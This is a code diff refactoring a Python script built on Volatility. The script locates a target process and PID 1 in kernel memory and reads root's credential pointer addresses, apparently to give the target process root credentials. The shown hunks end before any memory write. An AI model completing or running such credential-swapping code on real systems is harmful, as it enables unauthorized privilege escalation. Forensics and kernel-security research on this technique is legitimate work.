@@ -42,9 +42,9 @@ registry.PluginImporter()
 registry.register_global_options(config, addrspace.BaseAddressSpace)
 
 # Function to get a task object for given PID using volatility profile and address space
-def get_task(addr_space, profile, pid):
+def get_task(addr_space, pid):
 
-    init_task_addr = profile.get_symbol("init_task")
+    init_task_addr = addr_space.profile.get_symbol("init_task")
     init_task = obj.Object("task_struct", vm = addr_space, offset = init_task_addr)
 
     tasks = [] # Using a list for potential support of multiple processes with same PID
@@ -63,16 +63,15 @@ def get_task(addr_space, profile, pid):
 try:
     # Initialize address space (same as a=addrspace() in linux_volshell)
     addr_space=utils.load_as(config)
-    profile=addr_space.profile
 
     # Get target task object
-    target_task = get_task(addr_space, profile, target_pid)
+    target_task = get_task(addr_space, target_pid)
     if(not target_task):
         print("Task with PID {} not found!".format(target_pid))
         sys.exit()
 
     # Get a task with root permissions, PID 1 is reliably root always
-    task_with_root = get_task(addr_space, profile, 1)
+    task_with_root = get_task(addr_space, 1)
 
     # Get virtual addresses for root task credentials pointers
     root_real_cred_va = task_with_root.real_cred.obj_offset
